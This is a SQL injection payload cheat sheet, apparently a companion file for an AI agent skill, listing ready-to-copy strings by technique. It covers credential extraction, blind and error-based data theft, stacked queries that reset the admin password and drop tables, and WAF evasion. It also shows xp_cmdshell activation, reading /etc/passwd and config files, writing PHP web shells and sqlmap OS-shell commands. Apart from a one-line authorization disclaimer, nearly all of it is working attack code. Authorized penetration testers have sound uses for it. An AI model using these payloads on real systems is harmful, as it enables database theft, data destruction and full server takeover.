# SQL Injection Payloads

> This file is a companion to `SKILL.md`, organizing common payloads for SQL injection testing by injection type.
> Purpose: Quickly find payloads for specific injection types, ready to copy for testing.
> All payloads are for authorized security testing only.

---

## Index

1. [Injection Point Detection](#1-injection-point-detection)
2. [UNION Injection](#2-union-injection)
3. [Error-based Injection](#3-error-based-injection)
4. [Boolean Blind Injection](#4-boolean-blind-injection)
5. [Time Blind Injection](#5-time-blind-injection)
6. [Double Query Injection](#6-double-query-injection)
7. [Stacked Queries](#7-stacked-queries)
8. [WAF Bypass Techniques](#8-waf-bypass-techniques)
9. [Cross-Database Injection](#9-cross-database-injection)
10. [File Read/Write and Privilege Escalation](#10-file-readwrite-and-privilege-escalation)

---

## 1. Injection Point Detection

### String Type Closure Probing

```sql
'          -- Single quote
"          -- Double quote
')         -- Single quote + parenthesis
"))        -- Double quote + double parenthesis
`          -- Backtick
```

### Injection Confirmation

```sql
-- String type
' AND '1'='1    -- Page normal
' AND '1'='2    -- Page abnormal -> injection confirmed

-- Numeric type
AND 1=1          -- Page normal
AND 1=2          -- Page abnormal -> injection confirmed

-- With comment characters
' AND '1'='1'-- -
' AND '1'='1'--+
' AND '1'='1'#    -- MySQL comment
```

---

## 2. UNION Injection

### Determine Column Count

```sql
' ORDER BY 1-- -     -- Success
' ORDER BY 5-- -     -- Failure -> columns < 5
' ORDER BY 3-- -     -- Success -> 3 columns total
```

### Identify Echo Position

```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT NULL,NULL,NULL-- -    -- Compatible with all types
```

### Information Extraction

```sql
-- Database information
' UNION SELECT 1,database(),version()-- -
' UNION SELECT 1,@@datadir,@@version_compile_os-- -

-- Enumerate all databases
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata-- -

-- Enumerate tables in current database
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -

-- Enumerate column names
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -

-- Extract data
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

---

## 3. Error-based Injection

### extractvalue() (MySQL 5.1.5+, max 32 characters)

```sql
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--+
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--+
```

### updatexml() (MySQL 5.1.5+, max 32 characters)

```sql
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+
' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)--+
```

### Long Data Segmented Reading

```sql
-- Characters 1-31
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1,31),0x7e))--+
-- Characters 32-62
' AND extractvalue(1,concat(0x7e,SUBSTRING((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),32,31),0x7e))--+
```

---

## 4. Boolean Blind Injection

### Database Name Extraction

```sql
-- Determine length
' AND (SELECT LENGTH(database()))>5-- -
' AND (SELECT LENGTH(database()))>10-- -
' AND (SELECT LENGTH(database()))=8-- -

-- Character-by-character extraction
' AND SUBSTRING((SELECT database()),1,1)='s'-- -
' AND SUBSTRING((SELECT database()),2,1)='e'-- -
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100-- -

-- Binary search acceleration
' AND ASCII(SUBSTRING((SELECT database()),1,1))>115-- -
' AND ASCII(SUBSTRING((SELECT database()),1,1))<120-- -
```

### Table Name Extraction

```sql
' AND (SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema=database())>5-- -
' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'-- -
```

---

## 5. Time Blind Injection

### Basic Time Blind Injection

```sql
' AND IF(1=1,SLEEP(3),0)-- -
' AND IF(1=2,SLEEP(3),0)-- -

-- Extract database name
' AND IF(SUBSTRING((SELECT database()),1,1)='s',SLEEP(3),0)-- -
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100,SLEEP(3),0)-- -
```

### BENCHMARK Alternative (when SLEEP is filtered)

```sql
' AND IF(1=1,BENCHMARK(10000000,SHA1('test')),0)-- -
```

---

## 6. Double Query Injection

### floor()+rand()+group by (classic method, no length limit)

```sql
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

-- Extract table names
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

-- Extract column names
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+
```

### exp() / geometrycollection() / polygon()

```sql
' AND EXP(~(SELECT * FROM (SELECT database())x))--+
' AND geometrycollection((SELECT * FROM (SELECT database())x))--+
' AND multipoint((SELECT * FROM (SELECT database())x))--+
' AND polygon((SELECT * FROM (SELECT database())x))--+
```

---

## 7. Stacked Queries

```sql
'; SELECT user(),database(),@@version-- -
'; INSERT INTO users(username,password) VALUES('hacker','p@ss')-- -
'; UPDATE users SET password='hacked' WHERE username='admin'-- -
'; DROP TABLE logs-- -
```

---

## 8. WAF Bypass Techniques

### Comment Bypass

```sql
'/**/UNION/**/SELECT/**/1,2,3-- -
'/*!UNION*/ /*!SELECT*/ 1,2,3-- -                  -- MySQL inline comments
'/*!50000UNION*//*!50000SELECT*/ 1,2,3-- -          -- Specify version number
```

### Mixed Case

```sql
' UnIoN SeLeCt 1,2,3-- -
' uNiOn AlL sElEcT 1,2,3-- -
```

### Space Alternatives

```sql
'/**/UNION/**/SELECT/**/1,2,3-- -       -- Comment replacement
'%09UNION%09SELECT%091,2,3-- -           -- Tab
'%0aUNION%0aSELECT%0a1,2,3-- -           -- Newline
```

### Equivalent Function Replacement

```sql
-- SLEEP -> BENCHMARK
-- GROUP_CONCAT -> CONCAT_WS(0x3a,...)
-- SUBSTRING -> MID / LEFT / RIGHT
-- DATABASE() -> SCHEMA()
-- VERSION() -> @@VERSION
```

### sqlmap tamper Scripts

```bash
sqlmap -u "URL?id=1" --tamper=space2comment --batch
sqlmap -u "URL?id=1" --tamper=between,randomcase --batch
sqlmap -u "URL?id=1" --tamper=charencode --batch
```

---

## 9. Cross-Database Injection

### PostgreSQL

```sql
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT current_database()) AS int)--
' UNION SELECT pg_read_file('/etc/passwd'),2,3--    -- Requires superuser
```

### MSSQL

```sql
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT DB_NAME()))--
'; EXEC xp_cmdshell 'whoami'--    -- Requires sysadmin
'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
```

### Oracle

```sql
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
' UNION SELECT table_name,NULL,NULL FROM all_tables WHERE owner='SCHEMA_NAME'--
```

---

## 10. File Read/Write and Privilege Escalation

### MySQL File Read

```sql
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -
' UNION SELECT 1,LOAD_FILE('/var/www/html/config.php'),3-- -
' UNION SELECT 1,LOAD_FILE('C:\\inetpub\\wwwroot\\web.config'),3-- -    -- Windows
```

### MySQL File Write

```sql
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
' UNION SELECT 1,'<?php @eval($_POST["cmd"]); ?>',3 INTO DUMPFILE '/var/www/html/shell.php'-- -
```

### sqlmap OS Shell

```bash
sqlmap -u "URL?id=1" --os-shell
sqlmap -u "URL?id=1" --os-shell --web-root=/var/www/html
```
